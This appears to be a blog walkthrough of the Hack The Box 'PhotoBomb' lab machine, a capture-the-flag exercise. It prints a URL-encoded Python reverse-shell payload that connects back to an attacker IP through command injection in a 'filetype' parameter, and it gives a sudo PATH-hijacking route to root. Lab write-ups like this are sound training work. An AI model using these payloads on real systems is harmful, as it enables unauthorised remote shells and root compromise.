# :game_die: PhotoBomb Hack the box Walkthrough — [HTB]

---

# PhotoBomb Hack the box Walkthrough — [HTB]

## PhotoBomb Hack the box writeup

*Source: Hack the box*

Hey, Guys welcome to my blog Today we going to discuss about photoBomb hack the box machine which comes up with a Command injection vulnerability to get the user shell and abuses the sudo binary to get the root shell.

## Enumeration:

First as usual we start up with the Nmap scanSTEP 1: nmap -sC -sV 10.10.11.182

Usual ports and services are opened

So let's visit the web page [http://10.10.11.182](http://10.10.11.182)

So first add the photobomb.htb to /etc/hosts file

Now you can able to access that page

First I checked the login page with the default username and password but it did not work

So after analyzing this webpage I found the one hidden javascript file in the inspect or dev tools

So let's open this photobomb.js file

Further analyzing this I have found the username and password for the /printer directory

Next open that URL in a new tab and you get will get login access to the printer

Next, click the Download button and capture that request

In the filetype parameter, we going to try the command injection to get the reverse shell

## Get Vicky’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Here I tried the bash payload but It’s won’t work so I going to try the python

```
%3bexport+RHOST%3d"10.10.16.xx"%3bexport+RPORT%3d5050%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.sp
```

Before that set the listener using netcat

## Getting User Shell:

STEP 2: nc -lvp 5050

Booooomm!!!! Now you get the shell

STEP 3: cat user.txt

## Root Privilege:

So first we try sudo -l

Here you can able run the cleanup.sh file in root privilege without password

So lets us open that script

STEP 4: cat cleanup.sh

This script is just talking about log files and that logs are stored in photobomb.log.old and truncate to clear the photobomb.log

And it does not look like an absolute path so here we going to use the advantage of “find” binary

STEP 5: echo bash > find

STEP 6: chmod 777 find

STEP 7: sudo PATH=$PWD:$PATH /opt/cleanup.sh

Booooooommmm!!!!

## Getting Root shell:

Now you get the root shell of that machine

STEP 8: cat root.txt

I hope you will understand this article if you like this please support my OSCP Exam

---
